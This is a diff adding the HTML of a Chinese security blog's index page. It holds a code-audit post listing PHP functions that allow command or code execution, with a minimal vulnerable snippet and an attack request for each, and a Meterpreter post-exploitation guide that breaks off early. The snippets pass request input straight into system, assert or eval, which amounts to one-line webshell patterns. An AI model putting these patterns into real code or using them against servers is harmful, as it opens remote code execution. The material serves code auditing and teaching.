@@ -1,0 +1,1781 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="渗透测试 应急响应 代码审计">
+<meta property="og:type" content="website">
+<meta property="og:title" content="pplsec">
+<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:site_name" content="pplsec">
+<meta property="og:description" content="渗透测试 应急响应 代码审计">
+<meta property="og:locale" content="default">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pplsec">
+<meta name="twitter:description" content="渗透测试 应急响应 代码审计">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/">
+
+
+
+
+
+  <title>pplsec</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">pplsec</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">爱安全 爱生活</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/17/PHP命令执行&代码执行/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pplsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/ppl.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pplsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/17/PHP命令执行&代码执行/" itemprop="url">PHP命令执行&代码执行</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-17T08:39:54+08:00">
+                2019-01-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>常见php回调函数，可调用其他命令/代码执行函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()、call_user_func_array()、create_function()、</span><br><span class="line">array_walk()、 array_map()、array_filter()、	</span><br><span class="line">usort()、ob_start()、可变函数$_GET[&apos;a&apos;]($_GET[&apos;b&apos;])</span><br></pre></td></tr></table></figure></p>
+<p>常见php可执行系统命令的函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system()、passthru()、exec()、shell_exec()、pcntl_exec()、popen()、proc_open()</span><br><span class="line">、反单引号</span><br></pre></td></tr></table></figure></p>
+<p>常见php可代码执行的函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval()、assert()、preg_replace()、$</span><br></pre></td></tr></table></figure></p>
+<p>php配置文件php.ini里有个disable_functions = 配置选项，可自定义禁用某些php危险函数。如：<br>disable_functions =system,passthru,shell_exec,exec,popen</p>
+<h3 id="回调函数命令执行-代码执行"><a href="#回调函数命令执行-代码执行" class="headerlink" title="回调函数命令执行/代码执行"></a>回调函数命令执行/代码执行</h3><h4 id="1-call-user-func"><a href="#1-call-user-func" class="headerlink" title="1)    call_user_func()"></a>1)    call_user_func()</h4><p>call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )<br>call_user_func — 把第一个参数作为回调函数调用, 其余参数是回调函数的参数</p>
+<p>2019年1月11日ThinkPHP 5.0.x~5.2x爆出的远程代码执行漏洞就是由call_user_func()触发。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	call_user_func($_GET[&apos;a1&apos;],$_GET[&apos;a2&apos;]);</span><br><span class="line">	//xxx.php?a1=system&amp;a2=whoami  //命令执行</span><br><span class="line">	///xxx.php?a1=assert&amp;a2=phpinfo()   //代码执行</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>补充call_user_func函数使用示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function welcome($name)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;hello $name &lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(&apos;welcome&apos;, &quot;tom&quot;);</span><br><span class="line">call_user_func(&apos;welcome&apos;, &quot;jack&quot;);</span><br><span class="line">//输出 hello tom  hello jack </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="2-call-user-func-array"><a href="#2-call-user-func-array" class="headerlink" title="2)    call_user_func_array()"></a>2)    call_user_func_array()</h4><p>call_user_func_array ( callable $callback , array $param_arr )<br>call_user_func_array()把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	call_user_func_array($_GET[&apos;a1&apos;],$_GET[&apos;a2&apos;]);</span><br><span class="line">	//xxx.php?a1=system&amp;a2[]=whoami</span><br><span class="line">	//xxx.php?a1=assert&amp;a2[]=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="3-create-function"><a href="#3-create-function" class="headerlink" title="3)    create_function()"></a>3)    create_function()</h4><p>create_function ( string $args , string $code )<br>创建匿名函数（Anonymous functions），允许 临时创建一个没有指定名称的函数。最经常用作回调函数（callback）参数的值<br>create_function内部使用了eval来执行代码。</p>
+<p>WordPress &lt;= 4.6.1 使用语言文件任意代码执行漏洞就是由create_function()触发。<br><a href="http://blog.knownsec.com/2016/10/wordpress-4-6-1-language-exploit/" target="_blank" rel="noopener">http://blog.knownsec.com/2016/10/wordpress-4-6-1-language-exploit/</a>  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$b=create_function(&apos;&apos;, @$_REQUEST[&apos;a&apos;]);$b();</span><br><span class="line">//xxx.php?a=phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="4-array-walk"><a href="#4-array-walk" class="headerlink" title="4)    array_walk()"></a>4)    array_walk()</h4><p>rray_walk ( array &amp;$array , callable $callback [, mixed $userdata = NULL ] )<br>array_walk — 使用用户自定义函数对数组中的每个元素做回调处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	array_walk($_GET[&apos;a&apos;],$_GET[&apos;b&apos;]);</span><br><span class="line">	//xxx.php?a[]=phpinfo()&amp;b=assert</span><br><span class="line">	//xxx.php?a[]=whoami&amp;b=system</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="5-array-map"><a href="#5-array-map" class="headerlink" title="5)    array_map()"></a>5)    array_map()</h4><p>array_map ( callable $callback , array $array1 [, array $… ] )<br>array_map()为数组的每个元素应用回调函数。<br>返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	array_map($_GET[&apos;a&apos;],$_GET[&apos;b&apos;]);  </span><br><span class="line">	//xxx.php?a=system&amp;b[]=whoami</span><br><span class="line">	//xxx.php?a=assert&amp;b[]=phpinfo()</span><br><span class="line">	</span><br><span class="line">	//$array = array(0,1,2,3,4,5);</span><br><span class="line">	//array_map($_GET[&apos;a&apos;],$array);</span><br><span class="line">	//.php?a=phpinfo</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="6-array-filter"><a href="#6-array-filter" class="headerlink" title="6)    array_filter()"></a>6)    array_filter()</h4><p>array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )<br>array_filter()用回调函数过滤数组中的单元。依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	array_filter(array($_GET[&apos;cmd&apos;]),$_GET[&apos;func&apos;]);</span><br><span class="line">	//?func=system&amp;cmd=whoami</span><br><span class="line">	//?func=assert&amp;cmd=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="7-usort"><a href="#7-usort" class="headerlink" title="7)    usort()"></a>7)    usort()</h4><p>usort ( array &amp;$array , callable $value_compare_func )<br>本函数将用用户自定义的比较函数对一个数组中的值进行排序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //php5.6版本以下 </span><br><span class="line">   usort($_GET,&apos;system&apos;);    //xxx.php?1=1&amp;2=whoami</span><br><span class="line">   //usort($_GET,&apos;assert&apos;);   //xxx.php?1=1&amp;2=phpinfo()</span><br><span class="line">   //usort($_GET,&apos;syst&apos;.&apos;em&apos;);     </span><br><span class="line">   //usort($_GET,&apos;asse&apos;.&apos;rt&apos;);    </span><br><span class="line">   //php5.6以上</span><br><span class="line">   //usort(...$_GET);   xxx.php?1[]=test&amp;1[]=phpinfo();&amp;2=assert</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="8-ob-start"><a href="#8-ob-start" class="headerlink" title="8)    ob_start()"></a>8)    ob_start()</h4><p>ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )<br>ob_start — 打开输出控制缓冲</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cmd = &apos;system&apos;;ob_start($cmd);echo &quot;$_GET[a]&quot;;ob_end_flush();</span><br><span class="line">	//xxx.php?a=whoami</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="9-可变函数-var-args"><a href="#9-可变函数-var-args" class="headerlink" title="9)    可变函数$var(args)"></a>9)    可变函数$var(args)</h4><p><a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="noopener">http://php.net/manual/zh/functions.variable-functions.php</a><br>PHP 支持可变函数的概念。如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	$_GET[&apos;a&apos;]($_GET[&apos;b&apos;]);</span><br><span class="line">    //xxx.php?a=system&amp;b=whoami</span><br><span class="line">   //xxx?a=assert&amp;b=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>补充可变函数示例:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function welcome() &#123;</span><br><span class="line">    echo &quot;hello lltest&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = &apos;welcome&apos;;</span><br><span class="line">$test(); </span><br><span class="line">@$_GET[&apos;a&apos;]();   //xxx.php?a=welcome    </span><br><span class="line"></span><br><span class="line">function welcome2($name) &#123;  //带参数</span><br><span class="line">    echo &quot;hello $name&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">@$_GET[&apos;b&apos;]($_GET[&apos;c&apos;]);   //xxx.php?a=welcome&amp;b=welcome2&amp;c=tom</span><br></pre></td></tr></table></figure></p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="10-system"><a href="#10-system" class="headerlink" title="10)    system()"></a>10)    system()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	system($_GET[&apos;a&apos;]);</span><br><span class="line">	//xxx.php?a=whoami</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="11-passthru"><a href="#11-passthru" class="headerlink" title="11)    passthru()"></a>11)    passthru()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	passthru($_GET[&apos;a&apos;]);</span><br><span class="line">	//xxx.php?a=whoami</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="12-exec"><a href="#12-exec" class="headerlink" title="12)    exec()"></a>12)    exec()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$output = exec($_GET[&apos;a&apos;]);</span><br><span class="line">	echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br><span class="line">	//xxx.php?a=whoami</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="13-shell-exec"><a href="#13-shell-exec" class="headerlink" title="13)    shell_exec()"></a>13)    shell_exec()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$output = shell_exec($_GET[&apos;a&apos;]);</span><br><span class="line">	echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br><span class="line">	//xxx.php?a=whoami</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="14-pcntl-exec"><a href="#14-pcntl-exec" class="headerlink" title="14)    pcntl_exec()"></a>14)    pcntl_exec()</h4><p>pcntl_exec — 在当前进程空间执行指定程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	pcntl_exec( &quot;/bin/bash&quot; , array(&quot;whoami&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="15-popen"><a href="#15-popen" class="headerlink" title="15)    popen()"></a>15)    popen()</h4><p>popen ( string $command , string $mode )<br>popen — 打开进程文件指针。打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">	$test = &quot;whoami&quot;;  </span><br><span class="line">	$fp = popen($test,&quot;r&quot;);  //popen打一个进程通道  </span><br><span class="line">  </span><br><span class="line">	while (!feof($fp)) &#123;      //从通道取出内容 </span><br><span class="line">		$out = fgets($fp, 4096);  </span><br><span class="line">		echo  $out;          </span><br><span class="line">	&#125;  </span><br><span class="line">	pclose($fp);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="16-proc-open"><a href="#16-proc-open" class="headerlink" title="16)    proc_open()"></a>16)    proc_open()</h4><p>proc_open — 执行一个命令，并且打开用来输入/输出的文件指针<br>类似 popen() 函数， 但是 proc_open() 提供了更加强大的控制程序执行的能力<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">	$test = &quot;whoami&quot;;  </span><br><span class="line">	$array =   array(  </span><br><span class="line">	array(&quot;pipe&quot;,&quot;r&quot;),   //标准输入  </span><br><span class="line">	array(&quot;pipe&quot;,&quot;w&quot;),   //标准输出内容  </span><br><span class="line">	array(&quot;pipe&quot;,&quot;w&quot;)    //标准输出错误  </span><br><span class="line"> );  </span><br><span class="line">  </span><br><span class="line">	$fp = proc_open($test,$array,$pipes);   //打开一个进程通道  </span><br><span class="line">	echo stream_get_contents($pipes[1]);    //为什么是$pipes[1]，因为1是输出内容  </span><br><span class="line">	proc_close($fp);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="17-反单引号"><a href="#17-反单引号" class="headerlink" title="17)    反单引号"></a>17)    反单引号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	echo `whoami`;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><h4 id="18-eval"><a href="#18-eval" class="headerlink" title="18)    eval()"></a>18)    eval()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	eval($_GET[&apos;a&apos;]);</span><br><span class="line">	//xxx.php?a=phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="19-assert"><a href="#19-assert" class="headerlink" title="19)    assert()"></a>19)    assert()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	assert($_GET[&apos;a&apos;]);</span><br><span class="line">	//xxx.php?a=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="20-preg-replace"><a href="#20-preg-replace" class="headerlink" title="20)    preg_replace()"></a>20)    preg_replace()</h4><p>php7.0.0不再支持 /e修饰符；php5.5.0     /e 修饰符已被弃用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@preg_replace(&quot;/abc/e&quot;,$_REQUEST[&apos;a&apos;],&quot;abcd&quot;);</span><br><span class="line">//xxx.php?a=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="21"><a href="#21" class="headerlink" title="21)    $"></a>21)    $</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	$&#123;phpinfo()&#125;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>参考:<br><a href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a>  php代码/命令执行漏洞<br><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a> eval长度限制绕过 &amp;&amp; PHP5.6新特性</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/17/后渗透之meterpreter使用攻略/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pplsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/ppl.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pplsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/17/后渗透之meterpreter使用攻略/" itemprop="url">后渗透之meterpreter使用攻略</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-17T08:32:33+08:00">
+                2019-01-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>2018-08-06 首发于阿里先知: <a href="https://xz.aliyun.com/t/2536" target="_blank" rel="noopener">https://xz.aliyun.com/t/2536</a></p>
+<p>Metasploit中的Meterpreter模块在后渗透阶段具有强大的攻击力，本文主要整理了meterpreter的常用命令、脚本及使用方式。包含信息收集、提权、注册表操作、令牌操纵、哈希利用、后门植入等。</p>
+<h3 id="0x01-系统命令"><a href="#0x01-系统命令" class="headerlink" title="0x01.系统命令"></a>0x01.系统命令</h3><h4 id="1）基本系统命令"><a href="#1）基本系统命令" class="headerlink" title="1）基本系统命令"></a>1）基本系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sessions    #sessions –h 查看帮助</span><br><span class="line">sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">run  #执行已有的模块，输入run后按两下tab，列出已有的脚本</span><br><span class="line">info #查看已有模块信息</span><br><span class="line">getuid # 查看权限 </span><br><span class="line">getpid # 获取当前进程的pid</span><br><span class="line">sysinfo # 查看目标机系统信息</span><br><span class="line">ps 